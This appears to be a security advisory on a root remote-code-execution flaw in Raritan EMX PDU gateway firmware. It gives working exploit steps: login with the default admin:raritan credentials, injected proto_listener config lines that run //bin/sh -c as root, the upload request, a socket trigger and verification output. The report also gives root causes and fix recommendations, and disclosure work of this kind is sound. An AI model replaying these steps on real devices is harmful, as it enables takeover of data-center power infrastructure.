# Raritan EMX — Authenticated Config Injection into port_mux proto_listener → Root RCE

## 1. Overview

Raritan EMX is a closed-source data-center PDU gateway (CII power infrastructure) that provides web GUI and SNMP management of rack power distribution units. Firmware emx_ecx_3.6.1_46982 runs an ARM uClibc embedded Linux with BusyBox httpd, haserl CGI, a cfgd configuration daemon, and `port_mux` (PortMuxDaemon) — an inetd-style port multiplexer running as root. `port_mux` listens on ports defined in the `proto_listener[<instance>]` configuration and, for each incoming TCP connection, executes `fork + execv(program, program_args)` as root.

The `proto_listener` configuration is writable over HTTP through `/cgi-bin/raw_config_update.cgi` (admin-authenticated). The configuration apply path (`get_config -s`) validates instance names but accepts arbitrary `program` values. An attacker with the default `admin:raritan` credentials modifies the existing `[http]` instance to run `//bin/sh -c <command>` on a new port; `cfgnotifyd` pushes the change to `port_mux` immediately, and any TCP connection to that port triggers root command execution. Verified end-to-end.

## 2. Vulnerability Summary

- **Type**: Authenticated configuration injection → root RCE (HTTP arming + TCP trigger)
- **Root cause 1 (CWE-74/CWE-284)**: `get_config -s` does not validate the `program` field of `proto_listener` entries (only rejects unknown instance names)
- **Root cause 2 (CWE-250)**: `port_mux` executes the configured `program`/`program_args` as root with no whitelist
- **Root cause 3 (CWE-798/CWE-521)**: factory-default `admin:raritan` credential grants the admin session needed to write the config
- **Result**: admin → upload malicious `proto_listener[http]` config → TCP connect → root RCE. CVSS 8.8.

## 3. Authentication Boundary

Login flow: `POST /cgi-bin/login_session.cgi` with `Content-Type: application/x-www-form-urlencoded` and body `login=admin&password=raritan` returns `token:<32-hex>`. Subsequent CGI requests carry `X-Sessiontoken: <token>`.

The default `admin:raritan` credential is the factory default (PBKDF2-SHA256/3000 hash stored in cfgd). `raw_config_update.cgi` requires the admin session, so Target A (anonymous) is architecturally unreachable; this is an authenticated (Target B) vulnerability.

## 4. Attack Surface

- **Entry**: `POST /cgi-bin/raw_config_update.cgi` (admin `X-Sessiontoken`, multipart `config_file`)
- **Controllable config fields**: `proto_listener[http].program`, `.program_args[0..N]`, `.port`, `.enabled`, `.listen_type`
- **Trigger**: any TCP connection to the injected port
- **Environment**: port_mux real uid=0 (root); no iptables restrictions on the device

## 5. Sink Identification

The sink is the TCP connection handler of `bin/port_mux` (ELF 32-bit ARM, PortMuxDaemon):

```
TCP connect → fork() + execv(program, program_args)
```

`program` and `program_args` come from the cfgd `proto_listener[<inst>]` configuration with no whitelist validation. `port_mux` runs with real uid 0.

`port_mux` is the actual consumer of the `proto_listener` CDL configuration (`etc/cfgd/cfg_pmux.cdl` defines `proto_listener: vector<proto_listener_entry>`); earlier analysis wrongly classified `proto_listener` as vestigial until the running `port_mux` binary (root) was identified.

## 6. Source Identification & Controllability

The source is the multipart `config_file` upload to `raw_config_update.cgi`. The pipeline:

```
update_raw_config_wrapper.sh → haserl http_upload_handler.sh (parse multipart, NAME=config_file)
  → raw_config_prepare_update.sh -T config_file (gzip staging)
  → raw_config_prepare_update.sh -R 3 (get_config -uv validation + copy + schedule reboot)
  → boot-restore (etc/sysconf.d/71-raw_config_update):
      replace_config_macros.sh filter (internal keys filtered; proto_listener.* passes except administratively_disabled)
      get_config -t -u -v -s < PREPROCESSED_CONFIG_FILE (applied to cfgd)
  → cfgnotifyd notifies proto_listener change
  → port_mux subscribes (cfg::ChangeHandlerRegistry::subscribe) and binds the new port
```

The config.txt format is `key=value` lines; the attacker fully controls `proto_listener[http].program` / `program_args` / `port` / `enabled`.

## 7. Data Flow

```
HTTP POST /cgi-bin/raw_config_update.cgi (admin X-Sessiontoken, multipart config_file)
  → update_raw_config_wrapper.sh: flock + PENDING state
  → haserl http_upload_handler.sh: parse multipart → gzip staging
  → raw_config_prepare_update.sh -R 3: validate + copy + schedule reboot
  → reboot → boot-restore 71-raw_config_update:
      replace_config_macros.sh (proto_listener.* passes)
      get_config -t -u -v -s < config → cfgd accepts program=//bin/sh
  → cfgnotifyd: notify proto_listener change
  → port_mux: bind new port 9996 (no daemon restart)
  → TCP connect 127.0.0.1:9996
  → port_mux fork + execv("//bin/sh", ["-c","echo HTTP_RCE_OK > /tmp/rce_http_marker.txt"]) AS ROOT
  → root-owned marker
```

## 8. Exploit Construction

Modify the existing `[http]` instance (unknown instance names such as `[pwn]` are rejected by `get_config -s`). Key config lines:

```
proto_listener[http].enabled=1
proto_listener[http].listen_type=any
proto_listener[http].port=9996
proto_listener[http].program=//bin/sh
proto_listener[http].program_args[0]=-c
proto_listener[http].program_args[1]=echo HTTP_RCE_OK > /tmp/rce_http_marker.txt
```

Construction notes:

- `program=//bin/sh` — cfgd accepts any string; no path whitelist
- `program_args[0]=-c` is mandatory (otherwise `sh` treats args[1] as a script filename; an earlier `[pwn]` attempt failed because args[0] was left as `-i`)
- `port=9996` — an attacker-chosen port away from in-use ports (80/443/8181)
- `enabled=1` + `listen_type=any`
- The `port_mux` exec environment has a restricted PATH, so commands with dependencies should use absolute paths or standalone binaries

## 9. Dynamic Verification

Environment: cloud server, chroot `squashfs-root` + qemu-arm-static; port_mux/cfgd/cfgnotifyd/httpd/jsonrpcd/luaserviced daemons running. The reboot wrapper short-circuits a real reboot in QEMU chroot; the apply mechanism (`get_config -s`) is identical to the real boot path.

Real HTTP request (admin token `12b7e078ca11ffd9345905560dbd1cf3`):

```
POST /cgi-bin/raw_config_update.cgi HTTP/1.1
Host: 127.0.0.1:8888
X-Sessiontoken: 12b7e078ca11ffd9345905560dbd1cf3
Content-Type: multipart/form-data; boundary=...
```

Response: `return_code=0`.

Apply evidence (`tmp/reboot_wrapper.log`):

```
RAW_CONFIG_FILE=/flashdisk/usb_fwupdate_raw_config applying
preprocess rc=0 size=756
get_config rc=0
```

cfgd state confirmed:

```
proto_listener[http].port=9996
proto_listener[http].program=//bin/sh
proto_listener[http].program_args[1]=echo HTTP_RCE_OK > /tmp/rce_http_marker.txt
```

port_mux listening:

```
LISTEN 0  10  *:9996  *:*  users:(("port_mux",pid=2573121,fd=11))
```

TCP trigger and root marker:

```python
import socket
s=socket.socket(); s.settimeout(3); s.connect(("127.0.0.1",9996)); s.close()
```

```
$ ls -la tmp/rce_http_marker.txt
-rw-r--r-- 1 root root 12  Jul 25 02:39 tmp/rce_http_marker.txt
$ cat tmp/rce_http_marker.txt
HTTP_RCE_OK
$ ps -o pid,user,comm -p 2573121
2573121 root     port_mux
```

The root-owned marker was produced by the HTTP-injected config command executed by `port_mux` (root) — authenticated HTTP-triggered root RCE reproduced.

## 10. Reachability & Impact

- **Reachability**: admin session via default `admin:raritan` → `raw_config_update.cgi` reachable; `get_config -s` accepts the injected program; `cfgnotifyd` applies the change without a daemon restart; any TCP connection to the injected port fires the root exec. Anonymous reachability is architecturally blocked.
- **Impact**: full root compromise of the PDU management gateway — power telemetry, network configuration, and rack power infrastructure under attacker control. In a data center this is a foothold on the power-management plane.
- **Scope**: Raritan EMX/ECX deployments (EOL firmware) in data centers and telecom facilities.

## 11. Fix Recommendations

1. Validate `proto_listener[<inst>].program` against a whitelist of predefined binary paths (e.g., `//sbin/httpd`, `//sbin/httpredir`); reject `//bin/sh` and other arbitrary paths.
2. Restrict instance names to the predefined set (http/https/localhttp/mbusd/ssh); do not allow modifying existing instances to arbitrary programs.
3. Sanitize `program_args` — reject shell metacharacters and `-c` with arbitrary commands.
4. Drop privileges in `port_mux` (setuid non-root) before `execv`.
5. Enforce a mandatory password change on first login; ensure the `needDefaultPasswordChange` gate covers `raw_config_update.cgi`.

## 12. CWE & CVSS

- **CWE-74**: Improper Neutralization of Special Elements (config injection into program field)
- **CWE-250**: Execution with Unnecessary Privileges (port_mux runs as root)
- **CWE-798**: Use of Hard-coded Credentials (default admin:raritan)
- **CVSS**: 8.8 — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
